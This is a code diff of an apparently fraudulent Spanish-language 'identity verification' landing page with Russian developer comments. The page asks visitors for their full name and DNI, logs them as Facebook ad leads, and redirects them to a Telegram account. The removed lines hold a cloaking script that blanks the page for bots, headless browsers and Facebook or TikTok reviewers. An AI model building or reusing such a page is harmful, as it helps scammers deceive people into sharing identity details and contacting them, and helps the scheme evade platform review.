@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <title>Verificación de Identidad</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
+  
   <!-- Facebook Pixel -->
   <script>
     !function(f,b,e,v,n,t,s){
@@ -15,27 +15,8 @@
       n.queue=[];t=b.createElement(e);t.async=!0;
       t.src=v;s=b.getElementsByTagName(e)[0];
       s.parentNode.insertBefore(t,s)
-    }(window, document,'script',
-      'https://connect.facebook.net/en_US/fbevents.js');
+    }(window, document,'script','https://connect.facebook.net/en_US/fbevents.js');
     fbq('init', '739843071718618'); // ← твой пиксель
-  </script>
-
-  <!-- Лёгкая антибот-защита -->
-  <script>
-    document.addEventListener("DOMContentLoaded", function () {
-      const isBot = () => {
-        const nav = navigator;
-        return (
-          nav.webdriver ||
-          /bot|crawl|spider|facebook|tiktok|headless/i.test(navigator.userAgent) ||
-          screen.width < 400
-        );
-      };
-
-      if (isBot()) {
-        document.body.innerHTML = ""; // блокируем доступ боту
-      }
-    });
   </script>
 </head>
 
@@ -46,22 +27,29 @@
   <form id="veriForm" style="max-width:400px;margin:auto;">
     <input type="text" name="nombre" placeholder="Nombre completo" required style="width:100%;padding:10px;margin:10px;"><br>
     <input type="text" name="dni" placeholder="DNI" required style="width:100%;padding:10px;margin:10px;"><br>
-    <button type="submit" style="padding:10px 20px;">Conectarme</button>
+    <button id="submitBtn" type="submit" style="padding:10px 20px;">Conectarme</button>
   </form>
 
   <script>
-    document.getElementById("veriForm").addEventListener("submit", function(e) {
-      e.preventDefault();
+    document.addEventListener("DOMContentLoaded", function() {
+      document.getElementById("veriForm").addEventListener("submit", function(e) {
+        e.preventDefault();
 
-      // Пиксель фиксирует лид
-      fbq('track', 'Lead');
+        // Пиксель фиксирует лид
+        if (typeof fbq !== 'undefined') {
+          fbq('track', 'Lead');
+        }
 
-      // Переход в Telegram
-      window.location.href = "https://t.me/Veronica_especialista";
+        // Пауза, чтобы пиксель успел отправиться
+        setTimeout(function() {
+          window.location.href = "https://t.me/Veronica_especialista";
+        }, 500);
+      });
     });
   </script>
 </body>
 </html>
+
 
 
 
